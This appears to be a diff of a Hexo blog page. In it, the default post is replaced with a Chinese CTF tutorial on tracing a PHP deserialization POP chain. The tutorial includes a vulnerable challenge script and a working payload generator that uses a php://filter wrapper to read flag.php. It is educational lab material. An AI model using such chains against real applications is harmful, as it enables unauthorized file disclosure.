@@ -16,21 +16,21 @@
   <meta name="author" content="Yuanyi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="关于PHP反序列化的基础，大家可以自行学习。本次练习的题目比较简单，主要是利用简单题目讲解我自己对“如何寻找pop链”的理解。 废话少说，直接看代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php          &#x2F;&#x2F;flag is in flag.php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2023/07/21/hello-world/index.html">
+<meta property="og:title" content="Ez反序列化pop链构造思路">
+<meta property="og:url" content="http://example.com/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/index.html">
 <meta property="og:site_name" content="Myloveguoguo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="关于PHP反序列化的基础，大家可以自行学习。本次练习的题目比较简单，主要是利用简单题目讲解我自己对“如何寻找pop链”的理解。 废话少说，直接看代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php          &#x2F;&#x2F;flag is in flag.php">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-07-21T12:01:52.950Z">
-<meta property="article:modified_time" content="2023-07-21T12:31:44.978Z">
+<meta property="article:published_time" content="2023-07-21T13:35:08.000Z">
+<meta property="article:modified_time" content="2023-07-21T13:54:24.533Z">
 <meta property="article:author" content="Yuanyi">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Hello World - Myloveguoguo</title>
+  <title>Ez反序列化pop链构造思路 - Myloveguoguo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="Ez反序列化pop链构造思路"></span>
           
         </div>
 
@@ -207,7 +207,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-21 20:01" pubdate>
+        <time datetime="2023-07-21 21:35" pubdate>
           2023年7月21日 晚上
         </time>
       </span>
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          367 字
+          2.2k 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          4 分钟
+          19 分钟
         
       </span>
     
@@ -267,24 +267,38 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header">Ez反序列化pop链构造思路</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <p><strong>关于PHP反序列化的基础，大家可以自行学习。本次练习的题目比较简单，主要是利用简单题目讲解我自己对“如何寻找pop链”的理解。</strong></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="废话少说，直接看代码："><a href="#废话少说，直接看代码：" class="headerlink" title="废话少说，直接看代码："></a>废话少说，直接看代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <br>     <span class="hljs-comment">//flag is in flag.php</span><br>     <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;  <br>     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>; <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;  <br>         <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>); <br>     &#125;  <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);  <br>     &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);&#125; <br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<p><strong>其实我在做序列化题的时候，习惯性的会先找两个点：</strong></p>
+<p><strong>1.入口点</strong></p>
+<p>也就是我们参数的接收点，以上题为例就是：<code>@unserialize($_GET[&#39;pop&#39;]);</code></p>
+<p><strong>2.利用点</strong></p>
+<p>这个顾名思义也就是我们能够进行利用的店，以上题为例就是：<code>include($value);</code></p>
+<p>重点放在利用点上，我一般比较喜欢从利用点进行反推。</p>
+<p><strong>以上题为例，我们可以有如下思路：</strong></p>
+<p>首先我们知道利用点在<code>append（）</code>方法的传参点。那么我们首先找能够进行调用<code>append（）</code>方法的点。于是我们就锁定了<code>Modifier（）</code>类中的<code>__invoke（）</code>魔术方法。</p>
+<p><strong>__invoke()     &#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法</strong></p>
+<p><strong>__get（）  &#x2F;&#x2F;用于从不可访问的属性读取数据</strong></p>
+<p>那谁能调用这个<code>Modifier（）</code>类中的<code>__invoke（）</code>魔术方法呢？ </p>
+<p>答案是<code>Test（）</code>类中的<code>__get（）</code>方法中所具有的return</p>
+<p>那谁又能调用<code>Test（）</code>类中的<code>__get（）</code>方法呢？</p>
+<p>就是<code>Show（）</code>类中的<code>__tostring（）</code></p>
+<p>那这个<code>tostring（）</code>又该怎么调用呢？</p>
+<p>给他传一个对象<code>Show（）</code>，然后重写这个对象的<code>$source</code>变量</p>
+<p>就这样我们简单的推解出了整条pop链：</p>
+<p><strong>Modifier(__invoke)—-&gt;Test(__get)—&gt;Show(__tostring)—&gt;Show(__construct）</strong></p>
+<p>这个链条是按倒叙来进行推理的，那么我们在利用的时候要反过来正向利用。</p>
+<p><strong>编写代码如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>其实最终利用代码怎么写完全取决于个人习惯，主要的还是如何寻找利用链的思路。</p>
+<p>希望这种反推的思路能够帮助大家。</p>
 
                 
               </div>
@@ -292,6 +306,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="category-chain-item">基础漏洞</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -302,8 +337,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>http://example.com/2023/07/21/hello-world/</div>
+      <div>Ez反序列化pop链构造思路</div>
+      <div>http://example.com/2023/07/21/Ez反序列化pop链构造思路/</div>
     </div>
     <div class="license-meta">
       
@@ -347,15 +382,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/21/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" title="测试文章">
+                      <a href="/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/" title="Smartbi内置用户绕过浅析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">测试文章</span>
+                        <span class="hidden-mobile">Smartbi内置用户绕过浅析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2023/07/21/Python%E7%AE%80%E5%8D%95%E8%BF%9C%E8%81%94/" title="Python简单远联">
+                        <span class="hidden-mobile">Python简单远联</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
